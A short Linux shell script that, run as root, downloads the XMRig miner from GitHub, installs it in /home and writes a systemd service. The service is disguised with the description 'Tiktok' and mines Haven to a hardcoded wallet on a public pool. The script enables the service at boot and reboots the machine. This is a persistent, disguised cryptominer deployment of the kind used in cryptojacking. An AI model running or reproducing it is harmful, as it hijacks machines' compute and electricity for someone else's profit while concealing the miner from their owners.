cd /home
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
sudo apt update
sudo tar xvzf xmrig-6.18.1-linux-x64.tar.gz
sudo mv xmrig-6.18.1 xmrig
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/xmrig/xmrig --donate-level 1 -o haven.herominers.com:10451 -u hvs1Vke3xiNb1D6cYJRZk34vCrTYxVZU9W2NvdRTYPSCeiv3r3t3RZNJQDQ6jEu7X8SQmTKUtytmoX3TLeWCF8sR1n3pt7DWyo -p richVIP -a cn-heavy/xhv -k\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/haven.service'
sudo systemctl daemon-reload
sudo systemctl enable haven.service
echo "Setup completed!"
sudo reboot
